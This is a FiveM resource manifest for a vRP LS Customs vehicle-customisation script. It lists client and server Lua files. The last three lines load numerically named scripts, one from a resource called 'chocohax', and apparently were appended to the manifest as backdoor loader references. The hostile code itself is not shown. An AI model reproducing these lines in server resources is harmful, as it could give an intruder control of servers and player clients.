fx_version 'bodacious'
game 'gta5'



dependency "vrp"



client_scripts {

	"Proxy.lua",

	"menu.lua",

	"lsconfig.lua",

	"lscustoms.lua",

	

}



server_script {

	"@vrp/lib/utils.lua",

	"Proxy.lua",

	"Tunnel.lua",

	"lscustoms_server.lua"

}



client_script "00889.lua"
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'